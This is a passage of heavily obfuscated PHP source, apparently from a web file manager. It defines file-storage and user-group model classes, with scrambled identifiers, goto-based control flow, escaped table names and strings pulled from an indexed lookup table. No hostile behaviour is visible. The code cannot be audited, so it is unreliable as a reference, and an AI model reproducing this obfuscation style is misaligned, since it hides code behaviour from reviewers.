$_SERVER[µ…]; if (!$Dãí¬²¢‹) { return array(); } $fø²íİ„ÕÆ = array($a®Ğé„¡×ô[1708] => array($a®Ğé„¡×ô[7], $Dãí¬²¢‹)); goto E™ã¶è„…Ô; Cßî‘¦…±: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\x6c\x65"; protected $tableMeta = array("\x74\141\x62\154\145\116\x61\155\x65" => "\x69\157\x5f\146\x69\x6c\145\x5f\155\145\x74\141", "\155\x65\164\x61\x46\x69\x65\154\144" => "\x66\x69\154\x65\x49\104"); public function fileInfo($F½ªöÂ÷¤) { $Fƒï£´©Ÿ =& $_SERVER[µ…]; static $C‡Š–¾À“ = array(); if (!isset($C‡Š–¾À“[$F½ªöÂ÷¤])) { $c‰¬æïˆì‘ = $Fƒï£´©Ÿ[1713]; $C­Ô¦íÏ• = Model($Fƒï£´©Ÿ[444])->field($c‰¬æïˆì‘)->where(array($Fƒï£´©Ÿ[442] => $F½ªöÂ÷¤))->find(); $C‡Š–¾À“[$F½ªöÂ÷¤] = $C­Ô¦íÏ•; } return $C‡Š–¾À“[$F½ªöÂ÷¤]; } public function addFileByContent($Eß¢¨œ­“ = '', $E ×«ˆ = '') { goto AÉÙŠ“ˆÕê; AÉÙŠ“ˆÕê: $F©†îÒà =& $_SERVER[µ…]; $aÁ¿‡¥Ë¼« = TEMP_PATH . $F©†îÒà[1714]; if (!is_dir($aÁ¿‡¥Ë¼«)) { mk_dir($aÁ¿‡¥Ë¼«); } goto Cé‹âËö; A«ïƒÒàÎÄ: if (file_exists($dõ’ĞŠ›ùß)) { @unlink($dõ’ĞŠ›ùß); } return $CŸ„Ó¥Œáò; goto FéºñÁ¸Òå; Cé‹âËö: $dõ’ĞŠ›ùß = $aÁ¿‡¥Ë¼« . $F©†îÒà[1715] . rand_string(16); file_put_contents($dõ’ĞŠ›ùß, $Eß¢¨œ­“); $CŸ„Ó¥Œáò = $this->addFile($dõ’ĞŠ›ùß, $E ×«ˆ, !0); goto A«ïƒÒàÎÄ; FéºñÁ¸Òå: } public function createFileName($aÆÃÈŸ¾ª, $EÂøĞ”•ì = false, $eùÄøÚÎô = false) { goto E ¶ÖÄÃ¡Ö; E ¶ÖÄÃ¡Ö: $bÇ®²ŠË‡Ø =& $_SERVER[µ…]; $eğË•Æ†Š« = IO::init($bÇ®²ŠË‡Ø[8]); $Fàä–š‚± = $this->makeFilePath($aÆÃÈŸ¾ª, $eğË•Æ†Š«, $EÂøĞ”•ì, $eùÄøÚÎô); goto C‹Î¢ê¸í; C‹Î¢ê¸í: $bÑ¤’†¯¨ë = $eğË•Æ†Š«->pathFather($Fàä–š‚±); static $a×›¹ŒÏˆ¥ = false; $E”Ó«„Ÿé = $bÇ®²ŠË‡Ø[1716] . md5($bÑ¤’†¯¨ë); goto bØ÷ñ‡åì„; bØ÷ñ‡åì„: if (!$a×›¹ŒÏˆ¥ && !Cache::get($E”Ó«„Ÿé)) { $a×›¹ŒÏˆ¥ = !0; $cÖ˜Í¶ğÍÌ = IO::mkdir($bÑ¤’†¯¨ë); if (!IO::exist($cÖ˜Í¶ğÍÌ . $bÇ®²ŠË‡Ø[1717])) { IO::mkfile($cÖ˜Í¶ğÍÌ . $bÇ®²ŠË‡Ø[1717]); } Cache::set($E”Ó«„Ÿé, 1, 3600 * 2); } return $Fàä–š‚±; goto Cç÷ğª…×; Cç÷ğª…×: } public function makeFilePath($C‚é°Í†İã, $aì¾™‡ªâŞ, $DÇÖëÀ×…… = false, $c¹ØÌËñ± = false) { goto cÔùáåƒäÆ; Fä˜Û±ÇÓ: $f‰Ååå«Œ = $FÀáÖ¿¢º . rand_string(5) . short_id(100); $C‚é°Í†İã = str_replace($a‚‹‚Œ¿¦Á[8], $a‚‹‚Œ¿¦Á[70], KodIO::clear($C‚é°Í†İã)); $b”Õ…©Å™Ş = $aì¾™‡ªâŞ->ext($C‚é°Í†İã); goto eš‡½÷Ô‘‘; eš‡½÷Ô‘‘: if (!$C‚é°Í†İã) { $e¿¹æ•—§ = $a‚‹‚Œ¿¦Á[1720]; } switch ($e¿¹æ•—§) { case $a‚‹‚Œ¿¦Á[1721]: $f‰Ååå«Œ = $f‰Ååå«Œ . $a‚‹‚Œ¿¦Á[94] . $aì¾™‡ªâŞ->ext($C‚é°Í†İã); if ($b”Õ…©Å™Ş == $a‚‹‚Œ¿¦Á[1659]) { $f‰Ååå«Œ .= $a‚‹‚Œ¿¦Á[1407]; } break; case $a‚‹‚Œ¿¦Á[1722]: goto CÛßöÖµÕÃ; c†‚âßŒÌ÷: CacheLock::lock($DØøÀ°‡Ê); $f‰Ååå«Œ = $FÀáÖ¿¢º . $C‚é°Í†İã; if (IO::exist($FÀáÖ¿¢º . $C‚é°Í†İã)) { $aµ »ªô† = substr($C‚é°Í†İã, 0, strlen($C‚é°Í†İã) - strlen($b”Õ…©Å™Ş)); $bÊåöÔÙ = $c¹ØÌËñ± ? substr($c¹ØÌËñ±, 0, 5) : ($DÇÖëÀ×…… ? substr($DÇÖëÀ×……, 0, 5) : rand_string(5)); $f‰Ååå«Œ = $FÀáÖ¿¢º . $aµ »ªô† . $bÊåöÔÙ . $a‚‹‚Œ¿¦Á[94] . $b”Õ…©Å™Ş; } goto D‡Æ»ÕÙöä; D‡Æ»ÕÙöä: if (IO::isTypeObject($f‰Ååå«Œ) && !IO::isUploadServer($f‰Ååå«Œ)) { $Bƒ¦âŸ·É¯ = IO::setContent($f‰Ååå«Œ, $a‚‹‚Œ¿¦Á[33]); if (!$Bƒ¦âŸ·É¯) { show_json($a‚‹‚Œ¿¦Á[1726], !1); } } CacheLock::unlock($DØøÀ°‡Ê); break; goto DÌó¨¨ƒ—; Dœ±Œ©¯: $FÀáÖ¿¢º = $a‚‹‚Œ¿¦Á[1099] . $Cª„ßï¨‚°[$a‚‹‚Œ¿¦Á[388]] . $a‚‹‚Œ¿¦Á[396] . date($a‚‹‚Œ¿¦Á[1724]) . $B–õÁŸÛïø . $a‚‹‚Œ¿¦Á[8]; if ($b”Õ…©Å™Ş == $a‚‹‚Œ¿¦Á[1659]) { $C‚é°Í†İã .= $a‚‹‚Œ¿¦Á[1407]; } $DØøÀ°‡Ê = $a‚‹‚Œ¿¦Á[1725] . $FÀáÖ¿¢º . $C‚é°Í†İã; goto c†‚âßŒÌ÷; CÛßöÖµÕÃ: $F—‹¥Šç©‹ = Model($a‚‹‚Œ¿¦Á[1101])->get($a‚‹‚Œ¿¦Á[1403]); $B–õÁŸÛïø = substr(md5($a‚‹‚Œ¿¦Á[1723] . $F—‹¥Šç©‹ . date($a‚‹‚Œ¿¦Á[702])), 0, 8); $Cª„ßï¨‚° = KodIO::defaultDriver(); goto Dœ±Œ©¯; DÌó¨¨ƒ—: case $a‚‹‚Œ¿¦Á[1720]: break; default: break; } return $f‰Ååå«Œ; goto A¯¬¦ŠÛÄ·; cÔùáåƒäÆ: $a‚‹‚Œ¿¦Á =& $_SERVER[µ…]; $e¿¹æ•—§ = Model($a‚‹‚Œ¿¦Á[1101])->get($a‚‹‚Œ¿¦Á[1718]); $FÀáÖ¿¢º = KodIO::defaultIO() . date($a‚‹‚Œ¿¦Á[1719]); goto Fä˜Û±ÇÓ; A¯¬¦ŠÛÄ·: } public function addFileByRemote($EÛìƒñê¨à, $b«¹²ââäğ, $D¯ò˜“†¶ò = array()) { goto FÎŠÌ¶ğœõ; FÓò´ô‰º©: $eÈÓ‰¾‰ÌÅ = IO::hashMd5($EÛìƒñê¨à, $d‘ä‚É´•Õ); $b÷Û“®£´ = KodIO::defaultDriver(); $Aëì“âöĞ = array($fÙ¹¹‡ƒŞÎ[543] => IO::size($EÛìƒñê¨à), $fÙ¹¹‡ƒŞÎ[1727] => 1, $fÙ¹¹‡ƒŞÎ[407] => $b«¹²ââäğ, $fÙ¹¹‡ƒŞÎ[754] => $b÷Û“®£´[$fÙ¹¹‡ƒŞÎ[388]], $fÙ¹¹‡ƒŞÎ[408] => $EÛìƒñê¨à, $fÙ¹¹‡ƒŞÎ[1728] => $D¯ò˜“†¶ò[$fÙ¹¹‡ƒŞÎ[170]] ? $D¯ò˜“†¶ò[$fÙ¹¹‡ƒŞÎ[170]] : IO::hashSimple($EÛìƒñê¨à), $fÙ¹¹‡ƒŞÎ[1729] => $eÈÓ‰¾‰ÌÅ ? $eÈÓ‰¾‰ÌÅ : $d‘ä‚É´•Õ); goto CÃÒ£ ùÁ; FÎŠÌ¶ğœõ: $fÙ¹¹‡ƒŞÎ =& $_SERVER[µ…]; if (!IO::exist($EÛìƒñê¨à)) { return !1; } $d‘ä‚É´•Õ = $D¯ò˜“†¶ò[$fÙ¹¹‡ƒŞÎ[169]] ? $D¯ò˜“†¶ò[$fÙ¹¹‡ƒŞÎ[169]] : $fÙ¹¹‡ƒŞÎ[33]; goto FÓò´ô‰º©; CÃÒ£ ùÁ: if ($eâÀë— = $this->addFileCheckExist($Aëì“âöĞ[$fÙ¹¹‡ƒŞÎ[170]], $Aëì“âöĞ[$fÙ¹¹‡ƒŞÎ[169]], $Aëì“âöĞ[$fÙ¹¹‡ƒŞÎ[77]])) { return $eâÀë—; } return $this->addFileData($Aëì“âöĞ); goto C°‹Ú¤­; C°‹Ú¤­: } private function addFileData($cãŸÁ‚ö…â) { $C»£Äö¬Æ =& $_SERVER[µ…]; if (!$cãŸÁ‚ö…â) { return !1; } $cãŸÁ‚ö…â[$C»£Äö¬Æ[77]] = intval($cãŸÁ‚ö…â[$C»£Äö¬Æ[77]]); if (!$cãŸÁ‚ö…â[$C»£Äö¬Æ[77]] && strlen($cãŸÁ‚ö…â[$C»£Äö¬Æ[170]]) > 32) { $cãŸÁ‚ö…â[$C»£Äö¬Æ[77]] = intval(substr($cãŸÁ‚ö…â[$C»£Äö¬Æ[170]], 32)); } $C×İÛ“ä›Š = $this->add($cãŸÁ‚ö…â); return $this->find($C×İÛ“ä›Š); } public function addFile($D…ÌÔî†˜Ü, $E×Ø°Œ¯Œù, $Cö˜­ë = false) { goto F¼¶¶œ×æ“; f¥°ÚğÉ˜: $eøàÓ·‘’™ = $this->addFileMake($D…ÌÔî†˜Ü, $EµâŸŠÅ•, $aƒ—”îß¼, $cÃÙ•ÈÒ¾Å, $E×Ø°Œ¯Œù, $Cö˜­ë); $f¶¯ÚŒ ¦ = $this->addFileData($eøàÓ·‘’™); CacheLock::unlock($föõ°®Ø©Ï); goto cÜãÏâ‡ô; F‚Ã¼‡’†: $föõ°®Ø©Ï = $_SERVER[µ…][1730] . $cÃÙ•ÈÒ¾Å; CacheLock::lock($föõ°®Ø©Ï); if ($FƒİÍ¬ö®É = $this->addFileCheckExist($aƒ—”îß¼, $cÃÙ•ÈÒ¾Å, $EµâŸŠÅ•)) { CacheLock::unlock($föõ°®Ø©Ï); return $FƒİÍ¬ö®É; } goto f¥°ÚğÉ˜; cÜãÏâ‡ô: return $f¶¯ÚŒ ¦; goto B÷ÍºŠÇğæ; F¼¶¶œ×æ“: $aƒ—”îß¼ = IO::hashSimple($D…ÌÔî†˜Ü); $cÃÙ•ÈÒ¾Å = IO::hashMd5($D…ÌÔî†˜Ü); $EµâŸŠÅ• = IO::size($D…ÌÔî†˜Ü); goto F‚Ã¼‡’†; B÷ÍºŠÇğæ: } public function addFileMake($cÍ²ÖÓÇ­´, $aô¶”ù°Å›, $FšØ£é Ã², $f×ÄƒãÍ Î, $F°£®ó‚†, $fİ¦Ñø­¹ç) { goto f¨ìÀÉÆÍæ; FãôßÄïÉ: $a†‘ª’„ò‚ = get_path_this($Fõà¡‘äÔ£); if ($fİ¦Ñø­¹ç) { $bËˆÍäÉøÖ = IO::move($cÍ²ÖÓÇ­´, $bé¢½õòé†, !1, $a†‘ª’„ò‚); } else { $bËˆÍäÉøÖ = IO::copy($cÍ²ÖÓÇ­´, $bé¢½õòé†, !1, $a†‘ª’„ò‚); } if (!$bËˆÍäÉøÖ) { return !1; } goto DÉŠ‘Ã’Ó; f¨ìÀÉÆÍæ: $Aš¯¦ˆÌÊæ =& $_SERVER[µ…]; $Fõà¡‘äÔ£ = $this->createFileName($F°£®ó‚†, $FšØ£é Ã², $f×ÄƒãÍ Î); $bé¢½õòé† = get_path_father($Fõà¡‘äÔ£); goto FãôßÄïÉ; DÉŠ‘Ã’Ó: $E”Æ¶¡ó» = KodIO::defaultDriver(); $B…òÛ™Œæ¿ = array($Aš¯¦ˆÌÊæ[543] => $aô¶”ù°Å›, $Aš¯¦ˆÌÊæ[1727] => 1, $Aš¯¦ˆÌÊæ[407] => $F°£®ó‚†, $Aš¯¦ˆÌÊæ[754] => $E”Æ¶¡ó»[$Aš¯¦ˆÌÊæ[388]], $Aš¯¦ˆÌÊæ[408] => $Fõà¡‘äÔ£, $Aš¯¦ˆÌÊæ[1728] => $FšØ£é Ã², $Aš¯¦ˆÌÊæ[1729] => $f×ÄƒãÍ Î); return $B…òÛ™Œæ¿; goto C‰Ş¯§ë; C‰Ş¯§ë: } public function addFileCheckExist($CİÛ‹ãÉÚ¶, $AÕ×¹‡á¾Ù, $cöÁ½ÚÎ©ö) { $dŠÍ–µåƒ‡ =& $_SERVER[µ…]; $Dˆñ£Õ­ìø = $this->findByHash($CİÛ‹ãÉÚ¶, $AÕ×¹‡á¾Ù); if (!$Dˆñ£Õ­ìø) { return !1; } $a‘Ú…èÃã† = array($dŠÍ–µåƒ‡[1727] => intval($Dˆñ£Õ­ìø[$dŠÍ–µåƒ‡[1731]]) + 1, $dŠÍ–µåƒ‡[543] => $cöÁ½ÚÎ©ö); $this->where(array($dŠÍ–µåƒ‡[442] => $Dˆñ£Õ­ìø[$dŠÍ–µåƒ‡[441]]))->save($a‘Ú…èÃã†); return $Dˆñ£Õ­ìø; } public function remove($E‡º¸¨™‡’) { $this->linkCountChange($E‡º¸¨™‡’, !1); $this->clearEmpty(); return !0; } public function linkAdd($Fê£±í²¤) { $this->linkCountChange($Fê£±í²¤, !0); } public function linkCountChange($d×šÜ‹¥£, $F‚¦£ÀÇÄá) { goto A…¦°’’; E§­»”…•: foreach ($c•ìçøÊÓ„ as $fî¯¸´„³ => $d÷ÉÄÃå³ó) { $C¸³Ö ³´ = $d÷ÉÄÃå³ó . $aÇÂÔôÁŒÙ[33]; if (!$FŠÆ®Œ‹ÅÇ[$C¸³Ö ³´]) { $FŠÆ®Œ‹ÅÇ[$C¸³Ö ³´] = array(); } $FŠÆ®Œ‹ÅÇ[$C¸³Ö ³´][] = $fî¯¸´„³; } foreach ($FŠÆ®Œ‹ÅÇ as $d÷ÉÄÃå³ó => $FäÉ¶Îºáô) { if (!$FäÉ¶Îºáô) { continue; } $d÷ÉÄÃå³ó = $F‚¦£ÀÇÄá ? $d÷ÉÄÃå³ó : -intval($d÷ÉÄÃå³ó); $dš°‹£Œ½ = array($aÇÂÔôÁŒÙ[441] => array($aÇÂÔôÁŒÙ[7], $FäÉ¶Îºáô)); if ($d÷ÉÄÃå³ó < 0) { $dš°‹£Œ½[$aÇÂÔôÁŒÙ[1731]] = array($aÇÂÔôÁŒÙ[950], abs($d÷ÉÄÃå³ó)); } $this->where($dš°‹£Œ½)->setAdd($aÇÂÔôÁŒÙ[1731], $d÷ÉÄÃå³ó); } goto e¨¼›íÃˆ…; eˆ…Š§Ú‰: $c•ìçøÊÓ„ = array(); foreach ($d×šÜ‹¥£ as $fî¯¸´„³) { $C¸³Ö ³´ = $fî¯¸´„³ . $aÇÂÔôÁŒÙ[33]; if (!$c•ìçøÊÓ„[$C¸³Ö ³´]) { $c•ìçøÊÓ„[$C¸³Ö ³´] = 0; } $c•ìçøÊÓ„[$C¸³Ö ³´]++; } $FŠÆ®Œ‹ÅÇ = array(); goto E§­»”…•; A…¦°’’: $aÇÂÔôÁŒÙ =& $_SERVER[µ…]; if (!$d×šÜ‹¥£) { return; } if (!is_array($d×šÜ‹¥£)) { $d×šÜ‹¥£ = array($d×šÜ‹¥£); } goto eˆ…Š§Ú‰; e¨¼›íÃˆ…: } public function findByHash($C»¸ªö‰â˜, $A•æ¸‰‘´ = false) { $FÓ…è¨õºŸ =& $_SERVER[µ…]; if (!$C»¸ªö‰â˜ && !$A•æ¸‰‘´) { return !1; } $aßè’­½ = array($FÓ…è¨õºŸ[1728] => $C»¸ªö‰â˜); if ($A•æ¸‰‘´) { $aßè’­½ = array($FÓ…è¨õºŸ[1729] => $A•æ¸‰‘´); } return $this->order($FÓ…è¨õºŸ[1732])->where($aßè’­½)->find(); } public function clearEmpty($E–àìêº…â = 0) { goto F±„ø¸ ¼; f¹ç†ĞÀ: foreach ($fãåùŠ©¡– as $fà¬ã‡»»Ğ) { $d‰ŒÊÅ–•î->update(1); $this->resetFile($fà¬ã‡»»Ğ); } $d‰ŒÊÅ–•î->end(); goto D³Ô°÷¢î£; F±„ø¸ ¼: $b©ùÃÕ— =& $_SERVER[µ…]; $e½í¯ÉŸ·ó = time() - 3600 * 24 * $E–àìêº…â; $EšÛöø„ = $b©ùÃÕ—[1733] . $e½í¯ÉŸ·ó; goto CÀÙÜ±í«; CÀÙÜ±í«: $fãåùŠ©¡– = $this->where($EšÛöø„)->select(); if (!$fãåùŠ©¡–) { return; } $d‰ŒÊÅ–•î = new Task($b©ùÃÕ—[1734], $b©ùÃÕ—[33], count($fãåùŠ©¡–)); goto f¹ç†ĞÀ; D³Ô°÷¢î£: } public function resetFile($A˜ø‡ËÔ) { goto cÀ¶Óéâá–; cÀ¶Óéâá–: $Bù‡¾—®‹ï =& $_SERVER[µ…]; $AÊß÷è¦ÓÁ = array($Bù‡¾—®‹ï[442] => $A˜ø‡ËÔ[$Bù‡¾—®‹ï[441]]); $eÚˆåŠã¼· = Model($Bù‡¾—®‹ï[1181])->where($AÊß÷è¦ÓÁ)->count(); goto a‹ØµÑáÔ; A–š‚ˆßÚƒ: if ($A˜ø‡ËÔ[$Bù‡¾—®‹ï[1731]] != $B™ÍÌªÚíë) { $this->where($AÊß÷è¦ÓÁ)->save(array($Bù‡¾—®‹ï[1727] => $B™ÍÌªÚíë)); } goto D¾…ãŠæ›; a‹ØµÑáÔ: $D“¢ÛÀã¼ = Model($Bù‡¾—®‹ï[1735])->where($AÊß÷è¦ÓÁ)->count(); $B™ÍÌªÚíë = intval($eÚˆåŠã¼·) + intval($D“¢ÛÀã¼); if ($B™ÍÌªÚíë == 0) { IO::remove($A˜ø‡ËÔ[$Bù‡¾—®‹ï[75]]); $this->where($AÊß÷è¦ÓÁ)->delete(); $this->metaSet($A˜ø‡ËÔ[$Bù‡¾—®‹ï[441]], null, null); return; } goto A–š‚ˆßÚƒ; D¾…ãŠæ›: } public function storageInfo($fø…§ĞêŒÍ = false) { goto E”ˆÎ¥Òù´; E”ˆÎ¥Òù´: $DİÒ™çÔÛé =& $_SERVER[µ…]; $eïÅíï¸éô = $this->count() + 0.0; $dÈ‡Ğ²ÎæÃ = 0; goto bÍâºÊÏŞ ; bÍâºÊÏŞ : $fçáŒ£ÔĞÔ = 1; $FÃèßÚÂ‚® = 0; $c†¨­½†¦¹ = 5000; goto f‘Õ½›±äù; f‘Õ½›±äù: for ($Fˆõ÷ÚÆ = 0; $Fˆõ÷ÚÆ < $eïÅíï¸éô; $Fˆõ÷ÚÆ = $Fˆõ÷ÚÆ + $c†¨­½†¦¹) { $FÀ‹·©°Ş = $this->limit($Fˆõ÷ÚÆ, $Fˆõ÷ÚÆ + $c†¨­½†¦¹)->select(); foreach ($FÀ‹·©°Ş as $BàƒŒã­„¹) { $fçáŒ£ÔĞÔ += $BàƒŒã­„¹[$DİÒ™çÔÛé[77]] * $BàƒŒã­„¹[$DİÒ™çÔÛé[1731]]; $dÈ‡Ğ²ÎæÃ += $BàƒŒã­„¹[$DİÒ™çÔÛé[77]] * ($BàƒŒã­„¹[$DİÒ™çÔÛé[1731]] - 1); $FÃèßÚÂ‚® += $BàƒŒã­„¹[$DİÒ™çÔÛé[1731]]; } } $dİÊŸ©µĞ‹ = array($DİÒ™çÔÛé[1736] => $fçáŒ£ÔĞÔ, $DİÒ™çÔÛé[1737] => $dÈ‡Ğ²ÎæÃ, $DİÒ™çÔÛé[1738] => $dÈ‡Ğ²ÎæÃ / $fçáŒ£ÔĞÔ, $DİÒ™çÔÛé[81] => $eïÅíï¸éô, $DİÒ™çÔÛé[1739] => $FÃèßÚÂ‚®); return $dİÊŸ©µĞ‹; goto EôèÆÂ²Š; EôèÆÂ²Š: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\160"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\155\145" => "\147\x72\157\165\x70\x5f\x6d\145\164\x61", "\x6d\145\164\141\106\x69\x65\x6c\x64" => "\147\162\157\165\160\111\104"); protected function cacheFunctionAlias($cƒÆÔæ±ñ) { $aöİÙÒòµÇ =& $_SERVER[µ…]; return array($aöİÙÒòµÇ[1740] => array($cƒÆÔæ±ñ[0], $aöİÙÒòµÇ[1741]), $aöİÙÒòµÇ[1742] => array($cƒÆÔæ±ñ[0], $aöİÙÒòµÇ[1741])); } protected function getInfo($dÂÉŠË©÷) { $A¿±´Ì¦æí = $this->getInfoSimple($dÂÉŠË©÷); if (!$A¿±´Ì¦æí) { return !1; } return $this->_listDataApplyItem($A¿±´Ì¦æí); } protected function getInfoSimple($DÄæâ›Ï¶ç, $cë¬Ãõ¡¸Ñ = false) { $e¸½³ò¥˜ =& $_SERVER[µ…]; if ($cë¬Ãõ¡¸Ñ) { $c¦¿¤¶Åò = array($e¸½³ò¥˜[1669] => intval($DÄæâ›Ï¶ç)); $E²×éœªí = $this->where($c¦¿¤¶Åò)->find(); return is_array($E²×éœªí) ? $E²×éœªí : array(); } return $this->cacheFunctionGet($e¸½³ò¥˜[1743], $DÄæâ›Ï¶ç); } protected function groupAdd($AŒÃÖ¦»Ì) { goto AŠ˜¹ÕìƒÜ; Fäô¤®‹ˆ†: if (!empty($AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1669]])) { $f °šÑĞ½[$Dƒ•Œ¿¹Èà[1669]] = $AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1669]]; } $CëÌŒÑ‚Æã = $this->add($f °šÑĞ½); $this->setNamePinyin($CëÌŒÑ‚Æã, $f °šÑĞ½[$Dƒ•Œ¿¹Èà[28]]); goto e²·ªó¡†¢; e²·ªó¡†¢: if (isset($AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1746]])) { $this->metaSet($CëÌŒÑ‚Æã, array($Dƒ•Œ¿¹Èà[1746] => $AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1746]], $Dƒ•Œ¿¹Èà[1747] => $AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1747]])); unset($AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1746]]); unset($AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1747]]); } Model($Dƒ•Œ¿¹Èà[1181])->groupRootAdd($CëÌŒÑ‚Æã); return $CëÌŒÑ‚Æã; goto b÷¬–î‘î ; AŠ˜¹ÕìƒÜ: $Dƒ•Œ¿¹Èà =& $_SERVER[µ…]; if (!$AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[472]] && isset($AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1669]]) && $AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1669]] == 1) { if ($E½³ÖÏ‡ÉÍ = $this->getInfoSimple($AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1669]], !0)) { return $AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1669]]; } } else { $E½³ÖÏ‡ÉÍ = $this->getInfoSimple($AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[472]]); if (!$E½³ÖÏ‡ÉÍ) { return !1; } } $D‚…Ó…Îå = $Dƒ•Œ¿¹Èà[493]; goto Fº©–ÍÇäÇ; Fº©–ÍÇäÇ: if ($E½³ÖÏ‡ÉÍ[$Dƒ•Œ¿¹Èà[481]]) { $D‚…Ó…Îå = $E½³ÖÏ‡ÉÍ[$Dƒ•Œ¿¹Èà[481]] . $E½³ÖÏ‡ÉÍ[$Dƒ•Œ¿¹Èà[1669]] . $Dƒ•Œ¿¹Èà[47]; } $f °šÑĞ½ = array($Dƒ•Œ¿¹Èà[407] => $this->groupNameAuto($AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[472]], $AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[28]]), $Dƒ•Œ¿¹Èà[389] => $AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[472]], $Dƒ•Œ¿¹Èà[548] => $D‚…Ó…Îå, $Dƒ•Œ¿¹Èà[1744] => $AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1653]], $Dƒ•Œ¿¹Èà[1745] => 0, $Dƒ•Œ¿¹Èà[1673] => 0); if (isset($AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1692]])) { $f °šÑĞ½[$Dƒ•Œ¿¹Èà[1692]] = $AŒÃÖ¦»Ì[$Dƒ•Œ¿¹Èà[1692]]; } else { $BÁ›µ½‚°İ = $this->max($Dƒ•Œ¿¹Èà[1692]); if (!$BÁ›µ½‚°İ) { $BÁ›µ½‚°İ = 0; } $f °šÑĞ½[$Dƒ•Œ¿¹Èà[1692]] = $BÁ›µ½‚°İ + 1; } goto Fäô¤®‹ˆ†; b÷¬–î‘î : } protected function groupEdit($DÁ»—‘¯…£, $eˆŒÊÇ°ù) { goto E‘œëğ‹; E‘œëğ‹: $AÀ‚„ÂÎ” =& $_SERVER[µ…]; $bÀö‚ìÁô¹ = $this->getInfoSimple($DÁ»—‘¯…£); if (!$bÀö‚ìÁô¹) { return !1; } goto B²™×—»„†; CÚ‰›à—ŠÓ: if (isset($eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[28]]) && $eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[28]] != $bÀö‚ìÁô¹[$AÀ‚„ÂÎ”[28]]) { $this->_clearChildrenCache($bÀö‚ìÁô¹); } return $this->where(array($AÀ‚„ÂÎ”[1748] => $DÁ»—‘¯…£))->save($eˆŒÊÇ°ù); goto f‹¡Ÿö£á; B²™×—»„†: if (!empty($eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[472]])) { $aˆÅØ¢½¸… = $this->getInfoSimple($eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[472]]); if (!$aˆÅØ¢½¸…) { return !1; } if ($bÀö‚ìÁô¹[$AÀ‚„ÂÎ”[1669]] == $aˆÅØ¢½¸…[$AÀ‚„ÂÎ”[1669]]) { return !1; } if ($eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[472]] != $bÀö‚ìÁô¹[$AÀ‚„ÂÎ”[472]]) { if ($aˆÅØ¢½¸…[$AÀ‚„ÂÎ”[481]] !== $bÀö‚ìÁô¹[$AÀ‚„ÂÎ”[481]] && strpos($aˆÅØ¢½¸…[$AÀ‚„ÂÎ”[481]], $bÀö‚ìÁô¹[$AÀ‚„ÂÎ”[481]] . $bÀö‚ìÁô¹[$AÀ‚„ÂÎ”[1669]] . $AÀ‚„ÂÎ”[47]) === 0) { return !1; } $eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[548]] = $aˆÅØ¢½¸…[$AÀ‚„ÂÎ”[481]] . $eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[472]] . $AÀ‚„ÂÎ”[47]; $this->_changeChildLevel($bÀö‚ìÁô¹, $aˆÅØ¢½¸…); } } if (isset($eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[28]])) { $this->setNamePinyin($DÁ»—‘¯…£, $eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[28]]); } if (isset($eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[1746]])) { $this->metaSet($DÁ»—‘¯…£, array($AÀ‚„ÂÎ”[1746] => $eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[1746]], $AÀ‚„ÂÎ”[1747] => $eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[1747]])); unset($eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[1746]]); unset($eˆŒÊÇ°ù[$AÀ‚„ÂÎ”[1747]]); } goto CÚ‰›à—ŠÓ; f‹¡Ÿö£á: } private function _clearChildrenCache($b—›òã¸Ëº) { $D±¿ÔØºŸ =& $_SERVER[µ…]; $DîÚÇÛ«Çç = array($D±¿ÔØºŸ[548] => array($D±¿ÔØºŸ[507], $b—›òã¸Ëº[$D±¿ÔØºŸ[481]] . $b—›òã¸Ëº[$D±¿ÔØºŸ[1669]] . $D±¿ÔØºŸ[508])); $AÖé…„ÇùŞ = $this->field($D±¿ÔØºŸ[1669])->where($DîÚÇÛ«Çç)->select(); foreach ($AÖé…„ÇùŞ as $cà„ÖÏ»‡”) { $this->cacheFunctionClear($D±¿ÔØºŸ[1749], $cà„ÖÏ»‡”[$D±¿ÔØºŸ[1669]]); $this->cacheFunctionClear($D±¿ÔØºŸ[1743], $cà„ÖÏ»‡”[$D±¿ÔØºŸ[1669]]); } } private function _changeChildLevel($BÌ ì…ğ, $fà¸—÷óá, $Bªğøç¼…è = false) { goto EÃƒ¤…°åñ; eŸ¸ÆƒÃ„ò: if ($Bªğøç¼…è) { $DÎ¥‚£ƒÀø = $fà¸—÷óá[$c·Æ‹İë¢ö[481]] . $fà¸—÷óá[$c·Æ‹İë¢ö[1669]] . $c·Æ‹İë¢ö[47]; } $e§éõĞ³»Ó = array($c·Æ‹İë¢ö[548] => array($c·Æ‹İë¢ö[507], $BÌ ì…ğ[$c·Æ‹İë¢ö[481]] . $BÌ ì…ğ[$c·Æ‹İë¢ö[1669]] . $c·Æ‹İë¢ö[508])); $dæè³Ç = 